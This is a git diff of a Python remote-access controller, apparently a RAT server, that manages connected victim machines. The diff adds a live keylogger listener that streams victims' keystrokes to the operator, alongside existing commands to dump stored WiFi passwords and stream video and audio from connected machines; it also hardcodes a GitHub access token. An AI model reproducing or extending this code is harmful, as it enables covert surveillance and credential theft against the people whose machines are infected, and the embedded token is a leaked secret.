@@ -1,4 +1,4 @@
-import socket, os, threading, requests, re
+import socket, os, threading, requests, re, sys, keyboard
 from os import name
 from vidstream import StreamingServer
 from pyaudio import PyAudio, paInt16
@@ -23,7 +23,7 @@ def connected():
         return False
 if getSelfIp() not in("192.168.249.97") and connected():
     # First create a Github instance:
-    g = Github("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")
+    g = Github("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")
     # Then play with your Github objects:
     # for repo in g.get_user().get_repos():
     #     print(repo.name)
@@ -523,7 +523,41 @@ def testin(data, *cmd):
         if data == command:
             return True
     return False
-        
+def displayContinueSocket(stop):
+    DICT = {}
+    for thread in getConnected.getCurrentThreads():
+        DICT[thread.getCon()] = [thread.getName(), ""]
+    actuel = ""
+    pause = False
+    while True:
+        for con in getConnected.getCon():
+            try:
+                if not pause:
+                    con.settimeout(0.01)
+                    receive = con.recv(5).decode()
+                    if receive:
+                        delete = 0
+                        if receive == "x/332":
+                            DICT[con] = [DICT[con][0], DICT[con][1][:-1]]
+                            delete = 1
+                        elif receive == "w/145":
+                            DICT[con] = [DICT[con][0], ""]
+                            print()
+                        else:
+                            DICT[con] = [DICT[con][0], DICT[con][1]+receive]
+                        if DICT[con][0] != actuel and actuel != "":
+                            DICT[con] = [DICT[con][0], DICT[con][1]+"\n"]
+                        sys.stdout.flush() # Pour raffraichir l'affichage
+                        sys.stdout.write(chr(13)) # Retour chariot
+                        sys.stdout.write(' '*(len(DICT[con][0]+": "+DICT[con][1])+delete)) # Efface la ligne. Comprendre 100 > 99 = 1 caractere de moins
+                        sys.stdout.write(chr(13))
+                        sys.stdout.write(DICT[con][0]+": "+DICT[con][1])
+                        actuel = DICT[con][0]
+            except Exception as e:
+                pass
+        if stop():
+            break
+    print()
         
         
 # ! main
@@ -572,11 +606,14 @@ def command(commandToExecute):
                 print("ip error")
                 run = False
         elif testin(commandToExecute, 'ip'):
+            # afficher l'ip du server
             print(ipHost)
         elif testin(commandToExecute, "stop"):
+            # stop le programme
             global progrun
             progrun = False
         elif testin(commandToExecute, "wifi"):
+            # affiche les wifi et mdp des machine connecter
             for thread in getAll.getCurrentThreads():
                 print(f'list wifi de {thread.getName()}')
                 print()
@@ -593,7 +630,7 @@ def command(commandToExecute):
             except:
                 print('aucune aide ici...')
             command(inputcolor(preset=1))
-        elif testin(commandToExecute, 'reloadCo', 'restart', 'reload'):
+        elif testin(commandToExecute, 'reloadCo', 'restartCo'):
             restart()
         elif testin(commandToExecute, 'stopCo'):
             for thread in getAll.getCurrentThreads():
@@ -673,7 +710,7 @@ def registerCmdAcces(data):
         pass
 
 def sendData(data, RETURN=False):
-    global run, Send, mythreads, runCommand
+    global run, Send, mythreads, runCommand, pause
     datalist = data.split()
     numCmd = data.split("µ+µ")
     if len(numCmd) > 1:
@@ -804,6 +841,27 @@ def sendData(data, RETURN=False):
                 #     SocketCo.settimeout(3)
                 #     data = (SocketCo.recv(ceil(32768))).decode()
                 #     print(data)
+            elif testin(data, "listenKeylogger"):
+                send("listenKeyloggerTrue")
+                stop_display_continue_socket = False
+                threadingDisplayAll = threading.Thread(target=displayContinueSocket, args =(lambda : stop_display_continue_socket, ))
+                threadingDisplayAll.start()
+                print("press escape to quit")
+                while True:
+                    try:
+                        if keyboard.is_pressed("escape"):
+                            break
+                        elif keyboard.is_pressed("ctrl+p"):
+                            print("pause")
+                            if pause:
+                                pause = False
+                            else:
+                                pause = True
+                    except:
+                        pass
+                send("listenKeyloggerFalse")
+                stop_display_continue_socket = True
+                threadingDisplayAll.join()
             else:
                 runThreadingSendAndReceive(data)
         except Exception as e:
